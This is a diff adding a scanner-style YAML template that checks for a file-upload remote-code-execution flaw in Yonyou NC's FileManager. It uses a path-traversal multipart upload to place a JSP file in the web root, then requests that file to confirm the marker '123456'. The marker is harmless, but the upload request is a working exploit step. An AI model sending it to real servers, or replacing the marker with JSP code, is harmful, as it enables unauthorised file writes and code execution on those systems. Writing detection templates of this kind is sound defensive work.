@@ -1,0 +1,32 @@
+id:
+
+info:
+  name: 用友NC FileManager 文件上传致RCE漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /portal/pt/file/upload?pageId=login&filemanager=nc.uap.lfw.file.FileManager&iscover=true&billitem=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwebapps%5Cnc_web%5C
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
+    Content-Type: multipart/form-data; boundary=d0b7a0d40eed0e32904c8017b09eb305
+  data: |
+    --d0b7a0d40eed0e32904c8017b09eb305
+    Content-Disposition: form-data; name="file"; filename="test12.jsp"
+    Content-Type: text/plain
+  
+    123456
+    --d0b7a0d40eed0e32904c8017b09eb305--
+response1:
+  headers:
+  body:
+  code:
+requests2:
+  method: GET
+  path: /test12.jsp
+response2:
+  headers:
+  body: 123456
+  code: 200
